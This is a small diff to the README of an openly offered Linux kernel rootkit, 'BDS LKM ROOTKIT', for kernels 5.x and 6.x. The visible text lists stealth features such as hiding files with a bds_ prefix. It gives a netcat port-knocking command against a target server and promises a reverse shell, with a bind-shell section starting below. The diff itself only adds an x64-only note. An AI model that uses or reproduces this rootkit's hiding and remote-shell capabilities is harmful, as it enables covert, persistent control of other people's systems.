@@ -1,7 +1,6 @@
 <h2>BDS LKM ROOTKIT</h2>
 <p>
 Linux Loadable Kernel Module Rootkit for Linux Kernel 5.x and 6.x on x86_64.
-
 <br>
 Developed by : Antonius 
 <br>
@@ -11,6 +10,8 @@ github : https://github.com/bluedragonsecurity
 <br>
 https://twitter.com/bluedragonsec
 <br>  
+This lkm rootkit works on x64 architecture only.
+<br>
 Features : 
 <ul>
   <li>hide files and directories with prefix bds_</li>
@@ -65,7 +66,10 @@ Open another terminal tab and do port knocking to target server :
 nc server ip 1337
 </pre>  
 Wait a few seconds and you will get reverse shell port connection from your target server.
+<br>
+
 </p>
+
 <p>
 <b>Activating Bind Shell</b>
 <br>
